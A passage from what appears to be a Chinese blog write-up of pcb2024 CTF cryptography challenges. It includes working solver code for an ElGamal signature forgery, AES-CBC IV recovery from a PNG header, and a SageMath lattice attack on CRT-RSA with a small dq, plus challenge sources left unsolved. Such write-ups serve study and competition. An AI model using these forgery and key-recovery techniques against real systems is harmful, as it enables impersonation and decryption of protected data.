class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> gmpy2.gcd(k, p - <span class="number">1</span>) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    r = <span class="built_in">pow</span>(g, k, p)</span><br><span class="line">    s = ((m - d * r) * inverse(k, p - <span class="number">1</span>)) % (p - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> (r, s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Verity</span>(<span class="params">m, sign, public</span>):</span><br><span class="line">    m = bytes_to_long(m)</span><br><span class="line">    p, g, y = public</span><br><span class="line">    r, s = sign</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(g, m, p) == (<span class="built_in">pow</span>(y, r, p) * <span class="built_in">pow</span>(r, s, p)) % p:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chall</span>():</span><br><span class="line">    banner()</span><br><span class="line"></span><br><span class="line">    pub, pri = get_Key(<span class="number">512</span>)</span><br><span class="line">    png_data = get_pngdata()</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot;Hello! I&#x27;m Alice. To ensure that you are truly Bob, I need to verify your identity first!&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Can I help you sign once? Is there anything you need to sign?&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Here are your public key:<span class="subst">&#123;pub&#125;</span>&quot;</span>)</span><br><span class="line">    message = long_to_bytes(<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Give me what you need to sign:&quot;</span>)))</span><br><span class="line">    <span class="keyword">if</span> message == <span class="string">b&quot;Bob&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No, it&#x27;s not possible!!!&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Here are your sign:&quot;</span>)</span><br><span class="line">    r, s = Signature(message, pub, pri)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;r = <span class="subst">&#123;r&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;s = <span class="subst">&#123;s&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Tell me your signature so that I know you are truly Bob.&quot;</span>)</span><br><span class="line">    r = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;r = &quot;</span>))</span><br><span class="line">    s = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;s = &quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> Verity(<span class="string">b&quot;Bob&quot;</span>, (r, s), pub):</span><br><span class="line">        <span class="built_in">print</span>(</span><br><span class="line">            <span class="string">&quot;I have a great photo that I would like to share with you. Let&#x27;s send it to you in our old way! Hope you still keep our IV!&quot;</span></span><br><span class="line">        )</span><br><span class="line">        aes = AES.new(KEY, AES.MODE_CBC, iv)</span><br><span class="line">        enc_data = <span class="built_in">hex</span>(bytes_to_long(aes.encrypt(png_data)))[<span class="number">2</span>:]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Here is my encoded data:<span class="subst">&#123;enc_data&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Here is my key:<span class="subst">&#123;KEY.decode()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;In summary, I wish you a wonderful day!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Alright, you&#x27;re not Bob, I don&#x27;t have anything to chat with anymore.&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        chall()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这道题(当时好眼熟，没看出来)，<code>ElGamal签名方案</code>，但是环境题，想放后面做，结果没时间看了</p><p>赛后再看，应该就是选择签名伪造了，这里我们可以得到消息的签名(即<code>rs</code>)，然后进行验证<br /><img src="https://pic1.zhimg.com/80/v2-adb3f6da452b31564230aea1107cc62c_1440w.png" alt="" /><br /><a href="https://ctf-wiki.org/crypto/signature/elgamal/#_15">https://ctf-wiki.org/crypto/signature/elgamal/#_15</a><br />所以关键在于伪造消息<code>b'xxxx'</code>与<code>b'Bob</code>模<code>p-1</code>同余，同时题目还把公钥给了我们<code>(p, g, y)</code>，有<code>p</code>就够了</p><p>其实就是费马小定理，可以这样<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>g</mi><mi>m</mi></msup><mo>≡</mo><msup><mi>g</mi><mrow><mi>m</mi><mo>+</mo><mi>k</mi><mo>∗</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">g^{m}\equiv g^{m+k*(p-1)}(mod\ p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.858832em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.138em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">∗</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span><br />代码表示，<code>message = long_to_bytes(bytes_to_long(b'Bob')+pub[0]-1)</code></p><p>后面是<code>AES</code>，题目会给我们<code>KEY</code>，还是<code>CBC mode</code>，所以我们要把<code>iv</code>找出来<br /><img src="https://picx.zhimg.com/80/v2-8d912081ccb73bea5ace1d9628057fa9_1440w.png" alt="" /><br /><img src="https://picx.zhimg.com/80/v2-02cb496288e7eaa8013f7d6963ec8c92_1440w.png" alt="" /><br />还是老样子，<code>png</code>的前十六字节是固定的，<code>0x89504e470d0a1a0a0000000d49484452</code>，我们可以把密文通过<code>key</code>解密之后的数据异或<code>png</code>的文件头，即可拿到题目中的<code>iv</code><br />然后，密文通过<code>key</code>解密之后的数据，可以自己把<code>iv</code>设成全零，即可得到</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># 消息伪造</span></span><br><span class="line">pub = ()</span><br><span class="line">message = bytes_to_long(<span class="string">b&#x27;Bob&#x27;</span>)+pub[<span class="number">0</span>]-<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># iv恢复</span></span><br><span class="line">enc_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">head = <span class="number">0x89504e470d0a1a0a0000000d49484452</span></span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">data = bytes_to_long(aes.decrypt(<span class="built_in">bytes</span>.fromhex(enc_data)[:<span class="number">16</span>]))</span><br><span class="line">iv = long_to_bytes(data ^ head)</span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">png_data =aes.decrypt(<span class="built_in">bytes</span>.fromhex(enc_data))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;picture.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    f.write(png_data)</span><br></pre></td></tr></table></figure><p>思路跟大致的脚本如上，环境也没有了，就不写交互脚本了</p><h3 id="tarssc-pcb2024复现"><a class="markdownIt-Anchor" href="#tarssc-pcb2024复现"></a> tarssc-pcb2024(复现)</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">nbit  = <span class="number">1024</span></span><br><span class="line">beta  = <span class="number">0.30</span></span><br><span class="line">delta = <span class="number">0.10</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="built_in">int</span>(beta * nbit))</span><br><span class="line">q = getPrime(nbit - <span class="built_in">int</span>(beta * nbit))</span><br><span class="line"></span><br><span class="line">N = p * q</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    dq = random.randrange(<span class="number">1</span>,<span class="built_in">int</span>(N ** delta))</span><br><span class="line">    <span class="keyword">if</span> dq &gt; q-<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    dp = random.randrange(<span class="number">1</span>,p-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = Integer(crt([dp%(p-<span class="number">1</span>),dq%(q-<span class="number">1</span>)],[p-<span class="number">1</span>,q-<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> GCD(d,phi) == <span class="number">1</span>:</span><br><span class="line">        e = <span class="built_in">int</span>(inverse(d,phi))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">seckey, pubkey = (p,q,d,dp,dq), (N,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;N = <span class="subst">&#123;N&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag), e, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">N = 61857467041120006957454494977971762866359211220721592255304580940306873708357617802596067329984189345493420858543581027612648626678588277060222860337783377316655375278359169520243355170247177279595812282793212550819124960549824278287538977769728573023023364686725321548391592858202718446127851076431000427033</span></span><br><span class="line"><span class="string">e = 22696852369762746127523066296087974245933137295782964284054040654103039210164173227291367914580709029582944005335464668969366909190396194570924426653294883884186299265660358589254391341147028477295482787041170991166896788171334992065199814524969470117229229967188623636764051681654720429531708441920158042161</span></span><br><span class="line"><span class="string">c = 41862679760722981662840433621129671566139143933210627878095169470855743742734397276638345217059912784871301273620533442249011607182329472311453700434692358352210197988000738272869600692181834281813995048665466937302183039555350612260646428575598237960405962714063137455677605629008760761743568236135324015278</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>这题很明显是<code>crtRSA</code><br />看到有一题类似的，2021的极客大挑战<code>crtrsa</code><br />卡这题卡半天，可以测试一下题目的代码，发现<code>dq</code>是比<code>dp</code>小的，二者不平衡<br />可以试试<code>dq</code>泄露<a href="https://www.cnblogs.com/vconlln/p/17066500.html">https://www.cnblogs.com/vconlln/p/17066500.html</a><br />还发现了一篇论文<br /><a href="https://dds.sciengine.com/cfs/files/pdfs/1674-7267/6qxpd6SSmokuc5vLD-mark.pdf">https://dds.sciengine.com/cfs/files/pdfs/1674-7267/6qxpd6SSmokuc5vLD-mark.pdf</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> deepcopy</span><br><span class="line"><span class="comment"># https://www.iacr.org/archive/pkc2006/39580001/39580001.pdf</span></span><br><span class="line"><span class="comment"># Author: ZM__________J, To1in</span></span><br><span class="line">N = <span class="number">61857467041120006957454494977971762866359211220721592255304580940306873708357617802596067329984189345493420858543581027612648626678588277060222860337783377316655375278359169520243355170247177279595812282793212550819124960549824278287538977769728573023023364686725321548391592858202718446127851076431000427033</span></span><br><span class="line">e = <span class="number">22696852369762746127523066296087974245933137295782964284054040654103039210164173227291367914580709029582944005335464668969366909190396194570924426653294883884186299265660358589254391341147028477295482787041170991166896788171334992065199814524969470117229229967188623636764051681654720429531708441920158042161</span></span><br><span class="line">c = <span class="number">41862679760722981662840433621129671566139143933210627878095169470855743742734397276638345217059912784871301273620533442249011607182329472311453700434692358352210197988000738272869600692181834281813995048665466937302183039555350612260646428575598237960405962714063137455677605629008760761743568236135324015278</span></span><br><span class="line">alpha = log(e, N)</span><br><span class="line">beta = <span class="number">0.30</span></span><br><span class="line">delta = <span class="number">0.10</span></span><br><span class="line">P.&lt;x,y,z&gt;=PolynomialRing(ZZ)</span><br><span class="line"> </span><br><span class="line">X = ceil(<span class="number">2</span> * N^(alpha + beta + delta - <span class="number">1</span>))</span><br><span class="line">Y = ceil(<span class="number">2</span> * N^beta)</span><br><span class="line">Z = ceil(<span class="number">2</span> * N^(<span class="number">1</span> - beta))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> x*(N-y)+N</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trans</span>(<span class="params">f</span>):</span><br><span class="line">    my_tuples = f.exponents(as_ETuples=<span class="literal">False</span>)</span><br><span class="line">    g = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> my_tuple <span class="keyword">in</span> my_tuples:</span><br><span class="line">        exponent = <span class="built_in">list</span>(my_tuple)</span><br><span class="line">        mon = x ^ exponent[<span class="number">0</span>] * y ^ exponent[<span class="number">1</span>] * z ^ exponent[<span class="number">2</span>]</span><br><span class="line">        tmp = f.monomial_coefficient(mon)</span><br><span class="line">        </span><br><span class="line">        my_minus = <span class="built_in">min</span>(exponent[<span class="number">1</span>], exponent[<span class="number">2</span>])</span><br><span class="line">        exponent[<span class="number">1</span>] -= my_minus</span><br><span class="line">        exponent[<span class="number">2</span>] -= my_minus</span><br><span class="line">        tmp *= N^my_minus</span><br><span class="line">        tmp *= x ^ exponent[<span class="number">0</span>] * y ^ exponent[<span class="number">1</span>] * z ^ exponent[<span class="number">2</span>]</span><br><span class="line">        </span><br><span class="line">        g += tmp</span><br><span class="line">    <span class="keyword">return</span> g</span><br><span class="line">  </span><br><span class="line">m = <span class="number">5</span> <span class="comment"># need to be adjusted according to different situations</span></span><br><span class="line">tau = ((<span class="number">1</span> - beta)^<span class="number">2</span> - delta) / (<span class="number">2</span> * beta * (<span class="number">1</span> - beta))</span><br><span class="line">sigma = (<span class="number">1</span> - beta - delta) / (<span class="number">2</span> * (<span class="number">1</span> - beta))</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(sigma * m)</span><br><span class="line"><span class="built_in">print</span>(tau * m)</span><br><span class="line"> </span><br><span class="line">s = ceil(sigma * m)</span><br><span class="line">t = ceil(tau * m)</span><br><span class="line">my_polynomials = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m-i+<span class="number">1</span>):</span><br><span class="line">        g_ij = trans(e^(m-i) * x^j * z^s * f(x, y)^i)</span><br><span class="line">        my_polynomials.append(g_ij)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t+<span class="number">1</span>):</span><br><span class="line">        h_ij = trans(e^(m-i) * y^j * z^s * f(x, y)^i)</span><br><span class="line">        my_polynomials.append(h_ij)</span><br><span class="line">        </span><br><span class="line">known_set = <span class="built_in">set</span>()</span><br><span class="line">new_polynomials = []</span><br><span class="line">my_monomials = []</span><br><span class="line"> </span><br><span class="line"><span class="comment"># construct partial order</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(my_polynomials) &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(my_polynomials)):</span><br><span class="line">        f = my_polynomials[i]</span><br><span class="line">        current_monomial_set = <span class="built_in">set</span>(x^tx * y^ty * z^tz <span class="keyword">for</span> tx, ty, tz <span class="keyword">in</span> f.exponents(as_ETuples=<span class="literal">False</span>))</span><br><span class="line">        delta_set = current_monomial_set - known_set</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(delta_set) == <span class="number">1</span>:</span><br><span class="line">            new_monomial = <span class="built_in">list</span>(delta_set)[<span class="number">0</span>]</span><br><span class="line">            my_monomials.append(new_monomial)</span><br><span class="line">            known_set |= current_monomial_set</span><br><span class="line">            new_polynomials.append(f)            </span><br><span class="line">            my_polynomials.pop(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;GG&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">my_polynomials = deepcopy(new_polynomials)</span><br><span class="line"> </span><br><span class="line">nrows = <span class="built_in">len</span>(my_polynomials)</span><br><span class="line">ncols = <span class="built_in">len</span>(my_monomials)</span><br><span class="line">L = [[<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ncols)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nrows)]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nrows):</span><br><span class="line">    g_scale = my_polynomials[i](X * x, Y * y, Z * z)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ncols):</span><br><span class="line">        L[i][j] = g_scale.monomial_coefficient(my_monomials[j])</span><br><span class="line">        </span><br><span class="line"><span class="comment"># remove N^j</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nrows):</span><br><span class="line">    Lii = L[i][i]</span><br><span class="line">    N_Power = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (Lii % N == <span class="number">0</span>):</span><br><span class="line">        N_Power *= N</span><br><span class="line">        Lii //= N</span><br><span class="line">    L[i][i] = Lii</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ncols):</span><br><span class="line">        <span class="keyword">if</span> (j != i):</span><br><span class="line">            L[i][j] = (L[i][j] * inverse_mod(N_Power, e^m))</span><br><span class="line"> </span><br><span class="line">L = Matrix(ZZ, L)</span><br><span class="line">nrows = L.nrows()</span><br><span class="line"> </span><br><span class="line">L = L.LLL()</span><br><span class="line"><span class="comment"># Recover poly</span></span><br><span class="line">reduced_polynomials = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nrows):</span><br><span class="line">    g_l = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ncols):</span><br><span class="line">        g_l += L[i][j] // my_monomials[j](X, Y, Z) * my_monomials[j]</span><br><span class="line">    reduced_polynomials.append(g_l)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># eliminate z</span></span><br><span class="line">my_ideal_list = [y * z - N] + reduced_polynomials</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Variety</span></span><br><span class="line">my_ideal_list = [Hi.change_ring(QQ) <span class="keyword">for</span> Hi <span class="keyword">in</span> my_ideal_list]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(my_ideal_list),<span class="number">3</span>,-<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    V = Ideal(my_ideal_list[:i]).variety(ring=ZZ)</span><br><span class="line">    <span class="keyword">if</span> V:</span><br><span class="line">        p = <span class="built_in">int</span>(V[<span class="number">0</span>][<span class="string">&#x27;y&#x27;</span>])</span><br><span class="line">        q = N//p</span><br><span class="line">        <span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">        d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">        m = <span class="built_in">pow</span>(c,d,N)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)).decode())</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>确实是没有想到，比赛时方向一直卡在<code>crtrsa</code>，没太往<code>dp</code>泄露这边想</p><p>下面挂的是还没打出来的密码题，都大致看了一眼，当时时间不够了，一堆事围着我，吐了吐了，还是太菜了，不够快</p><h2 id="unsolved"><a class="markdownIt-Anchor" href="#unsolved"></a> UNSOLVED</h2><h3 id="polyprime-pcb2024"><a class="markdownIt-Anchor" href="#polyprime-pcb2024"></a> polyprime-pcb2024</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, isPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">k = getPrime(<span class="number">333</span> * <span class="number">5</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">temp_calc</span>(<span class="params">x</span>): </span><br><span class="line">    <span class="keyword">return</span> (x * random.randint(<span class="number">2</span>, <span class="number">5</span>)) ^ random.randint(<span class="number">100</span>, <span class="number">500</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">some_calc</span>(<span class="params">size, depth</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sums_calc</span>(<span class="params">base, degree</span>): </span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(degree): </span><br><span class="line">            temp = temp_calc(base ** i)</span><br><span class="line">            result += base ** i + temp // temp_calc(base**(i + <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        prime_number = getPrime(size)</span><br><span class="line"></span><br><span class="line">        temp_number = temp_calc(prime_number)</span><br><span class="line">        poly_primes = sums_calc(prime_number, depth)  </span><br><span class="line">        <span class="keyword">if</span> temp_number % <span class="number">3</span> == <span class="number">0</span>: </span><br><span class="line">            temp_number = temp_calc(poly_primes)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> isPrime(poly_primes):</span><br><span class="line">            <span class="keyword">return</span> prime_number, poly_primes</span><br><span class="line"></span><br><span class="line">p, q = some_calc(<span class="number">333</span>, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">n = p * q * k</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 659401821142664131364043958430747314465977448744532421905138184036743766362324320051729418680079590835903781525157600055608268591994754328563246418114269690475272262915661210669701969695314157602927462228079044905276064391615467601628466982949165371933147600418057089432876120807721483665788557812323607370950442342057254926375842684430119320789097029996211564275310819486004520088130146630452262340185192110066151930586956190499953220051855668474863659201165952231016814569364299000130323859609047687714260776467149437031397019411599103716200258382231589757031469168245396061619327867355414287059363691024984066070128364157490336808211223714816668548049472199794493895870662970541167490686648385211854469386812214775829776376273299648505880034651930322294605482489225723014758138525637864689594748771025870209444029669477294995691067669374491852721622469656239730320092112222948718027850386898461208936333788173263904607181823233002355650353116486156927403178510412091666951574340730799316032588099237</span></span><br><span class="line"><span class="comment"># c = 455042981325030540026829365098432813829591020497037525707600104817313008442900331256387443469027825344761381076471749826547710666806180999603254398722965179851898391700090501419875562919365894255855734276825027850795202733875071307773598881254863911398285400038957998385685292965812925607278232164067624548120378758414574370042945538632864154772437639053907149514588502689277630450575630168099810584842881257614115970132960679023265157277718654731105815060916800751033956715430930381384344469220951638102432198422350425390757155267143393385221465041749156153517556389417033187856017198907366720281408810250981776112815100319814215140919133440637395953567624057248002125277569474190364142291136361144552953540727462623677375371327473687508344483184466522697912317252462246054471196345909304668083637177166153036111122244170846815657389873986264187766636830907458940128844256504176917204131708083105093700023335939233711693409336968008112511482237441198116493965744903995545941700742865846469036763734618</span></span><br><span class="line"><span class="comment"># e = 0x10001</span></span><br></pre></td></tr></table></figure><h3 id="rickroll-pcb2024"><a class="markdownIt-Anchor" href="#rickroll-pcb2024"></a> rickroll-pcb2024</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HINT = ?</span><br><span class="line">FLAG = <span class="string">&quot;flag&#123;xxxxxxxx&#125;&quot;</span></span><br><span class="line">EFFECTIVE_ROW = <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rickroll_loader</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;rickroll&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        lines = [line.strip().encode() <span class="keyword">for</span> line <span class="keyword">in</span> file <span class="keyword">if</span> line.strip()]</span><br><span class="line">    <span class="keyword">return</span> lines</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_ezprime</span>(<span class="params">size</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        prime = getPrime(size)</span><br><span class="line">        <span class="keyword">if</span> isPrime(prime // <span class="number">2</span>):</span><br><span class="line">            <span class="keyword">return</span> prime</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secure_encrypt</span>(<span class="params">message_parts, hint_value</span>):</span><br><span class="line">    modulus = find_ezprime(<span class="number">260</span>)</span><br><span class="line"></span><br><span class="line">    key_material = os.urandom(<span class="number">32</span>)</span><br><span class="line">    multipliers = [getrandbits(<span class="number">256</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(EFFECTIVE_ROW)]</span><br><span class="line"></span><br><span class="line">    encrypted_parts = [</span><br><span class="line">        <span class="built_in">int</span>((multiplier * hint_value + bytes_to_long(xor(pad(chunk, <span class="number">32</span>)</span><br><span class="line">            [::-<span class="number">1</span>], key_material))) % (modulus - <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">for</span> multiplier, chunk <span class="keyword">in</span> <span class="built_in">zip</span>(multipliers, message_parts)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    